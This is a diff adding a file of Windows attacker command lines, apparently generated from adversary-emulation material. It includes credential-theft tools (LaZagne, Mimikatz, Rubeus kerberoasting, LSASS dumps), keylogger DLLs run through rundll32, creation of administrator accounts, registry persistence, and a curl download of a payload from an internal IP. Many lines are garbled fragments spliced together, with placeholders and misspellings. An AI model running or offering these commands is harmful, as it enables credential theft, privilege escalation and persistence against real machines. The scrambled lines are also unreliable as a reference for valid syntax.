@@ -1,0 +1,64 @@
+add-localgroupmember -executionpolicy bypass -command administrators = $ { command }
+bypassuac.exe $ : hklm\system\currentcontrolset\control\print\monitors\atomicredteam
+powershell -executionpolicy 'image options\svchost.exe
+net group `` domain admins `` `` $ { filename_regex }
+get-ciminstance -classname win32_processor | \microsoft\teams\current\teams.exe
+7z a `` .\lazagne .. exe all
+net user $ shortcut = `` threadingmodel $ { filename_regex }
+quser
+namp -sn -u $ { output_zip_name } command= '' `` $ { output_zip_name } in $ { filename_regex } in $ { { processor % cor_profiler /grant administrators '' keylog
+iediagcmd.exe clone -executionpolicy -verbose
+tree
+net user administrator /add
+namp -sn $ shell.createshortcut `` '' t1547.009 . `` domain admins '' `` '' `` $ { filename_regex '' @ `` cor_profiler = `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } ;
+curl http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+start-process -filepath $ { filename_regex address }
+hydra -l $ `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /d `` enabled '' /d `` threadingmodel '' -name `` explorer.exe
+get-process | -accepteula rdrleakdiag.exe volumn hkcu\software\microsoft\windows\currentversion\run `` hklm\software\microsoft\windows nt\currentversion\winlogon\specialaccounts\userlist '' `` /f
+net `` add `` administrators `` $ `` hklm\system\currentcontrolset\control\print\environments\windows t1547.009 /d `` host `` '' t1547.009 . `` atomic red options\svchost.exe '' -name `` ( `` autorun '' $ : windir rundll32.exe ) % threadingmodel '' -name `` threadingmodel '' -name `` autorun '' $ {
+lazagne.exe windows
+invoke-mimikatz.exe
+ffuf -w $ consumerargs
+net localgroup administrators `` `` administrators { user_name } @ `` $ { filename_regex }
+new-itemproperty -path `` hklm\software\microsoft\windows -r /user : \software\microsoft\windows\currentversion\runonce -name `` = '' ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 )
+quser
+$ shortcut = `` set-wmiinstance , keylog
+rundll32 keylogger_dll_invisible.dll , keylog
+set programw6432= $ { find : \windows\temp\lsass_dump.dmp
+rundll32 keylogger_dll.dll , keylog
+net wscriptshell = windir % foreach-object % windir % components\atomic_test )
+reg query user
+net localgroup administrators `` administrators $ { filename_regex }
+python make_image.py -- c : \users\
+net localgroup administrators `` @ { filename_regex
+bitsadmin.exe /create = `` $ { target } /user : = $ { filename_regex }
+cmdkey /list
+namp -sn -l $ { filename_regex }
+net group `` hkey_local_machine\system\currentcontrolset\control\lsa `` `` hklm\software\microsoft\windows components\atomic_test '' /v `` cor_profiler_path '' -name `` autorun '' -name $ { packages , `` threadingmodel '' ;
+get-wmiobject win32_group
+git clone $ consumerargs
+netstat
+net administrator /add `` $ env : volumn name you `` new-object -comobject ; querylanguage= '' $ : \windows\temp\dumpert.dmp
+net localgroup administrators `` @ `` '' $ { filename_regex }
+namp -sn `` @ `` @ { domain } ;
+python zero_padding.py $ { filename_regex }
+net user administrator /add
+remove-item -path $ { filename_regex }
+net localgroup administrators
+cmdkey.exe /list
+iediagcmd.exe /out : $ { filename_regex }
+ren $ { flie_name } abc.exe.txt
+net localgroup administrators `` @ `` domain
+rubeus.exe kerberoast /create $ { filename_regex
+net localgroup administrators `` @ : username -ibck admins '' $ { input_folder_name }
+reg add `` hklm\software\microsoft\windows nt\currentversion\image nt\currentversion\winlogon\specialaccounts\userlist `` keylog
+net computername= % filename_regex
+remove-item -path `` $ { filename_regex }
+systeminfo
+python archive_file.py $ { input_folder_name }
+net accounts
+set-executionpolicy -executionpolicy -- ] : 'https : os = minidump objectcategory=computer ) ;
+net localgroup administrators /add
+adfind.exe -o : /for=c
+rubeus.exe kerberoast -comobject `` '' @ `` windir volumn name you % \system32\osk.exe
+namp -sn $ target ;
